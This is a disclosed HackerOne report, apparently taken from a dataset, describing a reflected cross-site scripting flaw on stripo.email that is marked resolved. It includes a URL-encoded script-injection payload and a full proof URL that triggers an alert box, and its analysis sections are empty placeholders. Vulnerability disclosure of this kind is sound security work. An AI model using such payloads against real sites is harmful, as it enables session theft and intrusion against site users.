---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '714521'
original_report_id: '714521'
title: stripo.email reflected xss
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: stripo
created_at: '2019-10-15T13:37:08.301Z'
disclosed_at: '2019-12-26T13:31:04.830Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 69
asset_identifier: stripo.email
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# stripo.email reflected xss

## Metadata

- HackerOne Report ID: 714521
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: stripo
- Disclosed At: 2019-12-26T13:31:04.830Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello securitty team tested windows 10 and firefox 69.0.3 (64 bit)

test url: <https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry >

payload: %3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E

Proof Url : 
```
https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry%3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E
```
Proof Url open firefox 

{F608355}

## Impact

https://www.owasp.org/index.php?title=Reflected_XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
